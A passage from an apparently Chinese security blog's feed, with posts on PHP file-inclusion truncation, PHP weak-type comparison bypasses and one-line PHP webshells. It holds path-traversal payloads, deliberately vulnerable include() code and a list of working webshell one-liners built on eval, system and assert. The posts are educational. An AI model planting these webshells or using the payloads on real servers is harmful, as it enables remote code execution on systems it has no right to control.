class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞条件利用条件：</span></span><br><span class="line">magic_quotes_gpc=off</span><br><span class="line">PHP版本低于5.3.4</span><br><span class="line"><span class="comment">#漏洞代码示例</span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">payload:http://xxx.com/xx.php?filename=../../../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure><ul><li>路径长度截断文件包含</li></ul><p>操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用条件</span><br><span class="line">Windows 下目录的最大路径长度伟256B</span><br><span class="line">Linux 下目录的最大路径长度伟4096B</span><br><span class="line"><span class="comment">#代码示例</span></span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">payload:http://xxx,com/xx.php?filename=test.txt/./././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure><ul><li>点号截断文件包含示例代码</li></ul><p>在windows系统下，点号的长度大于256B时，就可以造成扩展名截断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">payload:http://xxx,com/xx.php?.........................................................................</span><br></pre></td></tr></table></figure><ul><li>防护措施</li></ul><p>过滤../../   http://  https://</p><p>php.ini配置文件中的allow_url_fopen=off   alllow_url_include=off   magic_quotes_gpc=on</p><p>白名单验证，仅允许包含运行的指定文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;文件包含漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务器执行代码时，可以通过文件包含函数加载另一个文件的代码，当被包含文件的代码中存在恶意代码时，也会将其解析并且执行，且该漏洞不只是出现在php语言中，还有其他语言，</summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="Webshell" scheme="https://sinevil.github.io/tags/Webshell/"/>
    
  </entry>
  
  <entry>
    <title>php弱类型比较</title>
    <link href="https://sinevil.github.io/2021/07/20/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/"/>
    <id>https://sinevil.github.io/2021/07/20/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/</id>
    <published>2021-07-20T03:19:58.000Z</published>
    <updated>2021-08-13T02:49:57.255Z</updated>
    
    <content type="html"><![CDATA[<p><strong>php弱类型比较</strong></p><ul><li>强类型与弱类型</li></ul><p>强类型</p><p>所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型。Java、.NET、C++等都是强类型语言，在变量使用之前必须声明变量的类型和名称；且不经强制转换不允许两种不同类型的变量互相操作。</p><p>弱类型</p><p>对数据的类型要求并不严格，可以让数据类型互相转换，弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据</p><ul><li>类型转换问题</li></ul><p>类型转换是无法避免的问题。例如需要将GET或者是POST的参数转换为int类型，或者是两个变量不匹配的时候，PHP会自动地进行变量转换。但是PHP是一个弱类型的语言，导致在进行类型转换的时候会存在很多意想不到的问题</p><ul><li>php弱类型比较实例<a href="https://www.php.net/manual/zh/types.comparisons.php">详情</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php中的 &quot;==&quot; 和 &quot;===&quot;</span></span><br><span class="line">“==”和“===”都是用来比较两个数值是否相等的操作符。</span><br><span class="line">当比较的两个值都是相同类型时候“==”和“===”是相等的。</span><br><span class="line">1==1（两个int）1.0==1.0（两个<span class="built_in">float</span>）‘H1TerHub’==’H1TerHub‘（两个字符串</span><br><span class="line">当前后两个值得类型不一样得时候， <span class="string">&quot;==&quot;</span>会自动转换类型</span><br><span class="line">当看到<span class="string">&quot;==&quot;</span>的时候就可以关注是否存在弱类型比较</span><br><span class="line"></span><br><span class="line"><span class="comment">#&quot;==&quot;类型转换的规则</span></span><br><span class="line">1、字符串和数字比较，字符串会被转换成数字。</span><br><span class="line">“admin”==0(<span class="literal">true</span>)//admin被转换成数字，由于admin是字符串，转换失败，int（admin）=0，所以比较结果是<span class="literal">true</span>。</span><br><span class="line"></span><br><span class="line">2、混合字符串转换成数字，看字符串的第一个</span><br><span class="line">“1admin”==1 “2admin”==2</span><br><span class="line"></span><br><span class="line">3、字符串开头以xex开头，x代表数字。会被转换成科学计数法</span><br><span class="line">x*10^x的形式 <span class="comment">#‘2e2’=2*10^2=200</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bool类型的ture跟任意字符串可以弱类型相等</span></span><br><span class="line">&lt;?php</span><br><span class="line">If ( <span class="literal">true</span>=“a”)&#123;</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line">“success”;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#md5</span></span><br><span class="line"><span class="variable">$array1</span>[] = array(</span><br><span class="line"><span class="string">&quot;foo&quot;</span> =&gt; <span class="string">&quot;bar&quot;</span>,</span><br><span class="line"><span class="string">&quot;bar&quot;</span> =&gt; <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="variable">$array2</span> = array(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">var_dump(md5(<span class="variable">$array1</span>)==var_dump(<span class="variable">$array2</span>));//<span class="literal">true</span></span><br><span class="line">md5()函数的描述是string md5 ( string <span class="variable">$str</span> [, bool <span class="variable">$raw_output</span> = <span class="literal">false</span> ] )，md5()中的需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，知识会无法正确地求出array的md5值，这样就会导致任意2个array的md5值都会相等</span><br><span class="line"></span><br><span class="line"><span class="comment">#switch</span></span><br><span class="line"><span class="variable">$i</span> =<span class="string">&quot;2abc&quot;</span>;</span><br><span class="line">switch (<span class="variable">$i</span>) &#123;</span><br><span class="line">　　<span class="keyword">case</span> 0:</span><br><span class="line">　　<span class="keyword">case</span> 1:</span><br><span class="line">　　<span class="keyword">case</span> 2:</span><br><span class="line">　　<span class="built_in">echo</span> <span class="string">&quot;i is less than 3 but not negative&quot;</span>;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">　　<span class="keyword">case</span> 3:</span><br><span class="line">　　<span class="built_in">echo</span> <span class="string">&quot;i is 3&quot;</span>;</span><br><span class="line">　　&#125;</span><br><span class="line">这个时候程序输出的是i is less than 3 but not negative，是由于switch()函数将<span class="variable">$i</span>进行了类型转换，转换结果为2</span><br><span class="line"></span><br><span class="line"><span class="comment">#Strcmp函数的漏洞</span></span><br><span class="line">Strcmp（str1, str2）是比较两个字符串，如果str1&lt;str2 则返回&lt;0；如果str1大于str2返回&gt;0；如果两者相等，返回0,rcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。</span><br><span class="line"><span class="variable">$array</span>=[1,2,3];</span><br><span class="line">　　var_dump(strcmp(<span class="variable">$array</span>,<span class="string">&#x27;123&#x27;</span>)); //<span class="literal">false</span>。</span><br><span class="line"></span><br><span class="line"><span class="comment"># json绕过</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key ==<span class="variable">$key</span> ) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line">输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于<span class="variable">$key</span>的值，但是<span class="variable">$key</span>的值我们不知道，这时我们构造一个和任意字符串返回为真的数组&#123;“key”:<span class="literal">true</span>&#125;。即可绕过</span><br><span class="line">payload=message=&#123;<span class="string">&quot;key&quot;</span>,<span class="literal">true</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#array_search的漏洞</span></span><br><span class="line">array_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，匹配元素的键名会被返回。如果没找到，则返回<span class="literal">false</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span>=array(1,4);</span><br><span class="line">var_dump(array_search(<span class="string">&quot;4admin&quot;</span>,<span class="variable">$a</span>)); // int(0)=&gt; 返回键值1</span><br><span class="line">var_dump(array_search(<span class="string">&quot;1admin&quot;</span>,<span class="variable">$a</span>)); // int(1) ==&gt;返回键值0</span><br><span class="line">这个和之前的类型转换类似，但是如果是array_search(“4admin”,<span class="variable">$a</span>,<span class="literal">true</span>),最后的“<span class="literal">true</span>”会禁止类型转换。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;php弱类型比较&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强类型与弱类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;强类型&lt;/p&gt;
&lt;p&gt;所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不</summary>
      
    
    
    
    <category term="基础语言" scheme="https://sinevil.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="php" scheme="https://sinevil.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马</title>
    <link href="https://sinevil.github.io/2021/07/19/%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
    <id>https://sinevil.github.io/2021/07/19/%E4%B8%80%E5%8F%A5%E8%AF%9D/</id>
    <published>2021-07-19T11:23:05.000Z</published>
    <updated>2021-08-02T09:04:24.445Z</updated>
    
    <content type="html"><![CDATA[<p><strong>php一句话木马</strong></p><p><code> &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code> </p><ul><li>运行原理</li></ul><p>php代码写在<?php ?> 中是因为这样服务器才能识别其为php代码，然后进行解析</p><p><code>@</code>符号的作用是不报错</p><p>php eval()的作用：把字符串按照php代码来计算，此字符串必须是合法的php代码，且必须以分号结尾</p><p>如果没有在代码字符串中调用return语句，则返回null，如果代码解析错误，则eval()函数返回false</p><p>实际上就是用post方法接收<code>[]</code>中的变量，然后把变量里面的字符串当做php代码来执行</p><ul><li>其他的一句话木马</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST1</span>);?&gt;</span><br><span class="line">&lt;?php <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);&#125;?&gt;</span><br><span class="line">&lt;?php system(<span class="variable">$_REQUEST1</span>);?&gt;</span><br><span class="line">&lt;?php (<span class="variable">$_</span>=@<span class="variable">$_GET1</span>).@<span class="variable">$_</span>(<span class="variable">$_POST1</span>)?&gt;</span><br><span class="line">&lt;?php eval_r(<span class="variable">$_POST1</span>)?&gt;</span><br><span class="line">&lt;?php @eval_r(<span class="variable">$_POST1</span>)?&gt;  <span class="comment">#容错代码</span></span><br><span class="line">&lt;?php assert(<span class="variable">$_POST1</span>);?&gt;  <span class="comment">#使用Lanker一句话客户端的专家模式执行相关的PHP语句</span></span><br><span class="line">&lt;?<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>]);?&gt;</span><br><span class="line">&lt;?<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>])?&gt;</span><br><span class="line">&lt;?php @preg_replace(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>);?&gt;  <span class="comment">#使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt;</span></span><br><span class="line">&lt;?php <span class="built_in">echo</span> `<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]` ?&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@eval_r(<span class="variable">$_POST</span>[sb])&lt;/script&gt;  <span class="comment">#绕过&lt;?限制的一句话</span></span><br><span class="line">&lt;?=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);  <span class="comment">#绕过&lt;?php ?&gt;限制的一句话 </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;php一句话木马&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt; &amp;lt;?php @eval($_POST[&amp;#39;cmd&amp;#39;]);?&amp;gt;&lt;/code&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运行原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;php代码写在&lt;?php </summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="Webshell" scheme="https://sinevil.github.io/tags/Webshell/"/>
    
  </entry>
  
</feed>
